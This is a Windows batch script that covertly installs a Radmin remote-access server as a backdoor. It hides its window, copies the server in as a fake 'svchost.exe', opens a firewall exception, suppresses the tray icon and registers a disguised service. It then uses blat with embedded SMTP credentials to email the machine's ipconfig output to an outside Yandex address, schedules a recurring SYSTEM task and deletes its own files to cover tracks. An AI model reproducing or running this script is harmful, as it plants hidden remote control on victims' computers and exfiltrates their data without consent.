

cmdow @ /HID


copy /y "blat.exe" "%SYSTEMROOT%/system32/blat.exe"
copy /y "blat.lib" "%SYSTEMROOT%/system32/blat.lib"
copy /y "blat.dll" "%SYSTEMROOT%/system32/blat.dll
copy /y "svchost.exe" "%SYSTEMROOT%/svchost.exe" 
copy /y "raddrv.dll" "%SYSTEMROOT%/raddrv.dll"
copy /y "admdll.dll" "%SYSTEMROOT%/admdll.dll"

netsh firewall add allowedprogram "%Windir%\svchost.exe" "Remote Administrator Server" ENABLE

REG ADD HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters /v DisableTrayIcon /t REG_BINARY /d 00000001 /f
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\r_server /v DisplayName /t REG_SZ /d "Service Host Controller" /f

"%SYSTEMROOT%/svchost.exe" /install /silence
"%SYSTEMROOT%/svchost.exe" /start

%SYSTEMROOT%/system32/blat.exe -install -server smtp.yandex.ru -port 587 -f nullbytewcorp@yandex.ru -u nullbytewcorp -pw 1q6yqwerty

ipconfig /all > %systemroot%/system32/ip.txt

blat.exe %systemroot%/system32/ip.txt -to nullbytewcorp@yandex.ru. 

schtasks /create /tn "security" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM" /tr %SYSTEMROOT%/system32\ip.bat


del cmdow.exe
del blat.exe
del blat.lib
del blat.dll
del raddrv.dll
del admdll.dll
del svchost.exe
del install.bat